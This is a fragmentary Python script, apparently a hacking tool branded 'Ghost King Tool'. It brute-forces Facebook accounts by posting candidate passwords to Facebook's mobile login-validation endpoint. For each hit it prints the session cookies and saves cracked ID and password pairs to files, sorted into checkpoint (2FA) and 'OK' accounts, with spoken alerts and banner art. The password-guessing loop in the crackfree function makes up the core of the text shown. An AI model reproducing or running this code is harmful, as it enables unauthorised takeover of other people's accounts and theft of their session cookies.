...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mWelCome To Ghost King Tool...! ')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/GHOST.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\33[1;92m╚═════════════════════════════════════════════╝
\33[1;92m╔═════════════════════════════════════════════╗
\33[1;92m║ FB ID : ADNAN EYAMIN \33[1;92m   ║
\33[1;92m╚═════════════════════════════════════════════╝"""
os.system('clear')
print(logo)
...
print('\033[0;97m═════════════════════════════════════════════')
os.system('espeak -a 300 " Welcome,   to,  EYAMIN,  King,  Tools"')
pass
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[GHOST-2F] {idf} • {pw}')
                ...
                print(f'\r\x1b[38;5;208m[GHOST-Ok💚] {idf} • {pw}\n\033[0;93m[💙] COOKIES • \033[1;96m{kuki} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  Ghost,  id"')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•GHOST-2F] {idf} • {pw}')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[38;5;208m[{time.strftime("%H:%M")}•GHOST-OK] {idf} • {pw} ')
                print('\x1b[38;5;50m=============================================')
                os.system('espeak -a 300 " Ok,  Ghost,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
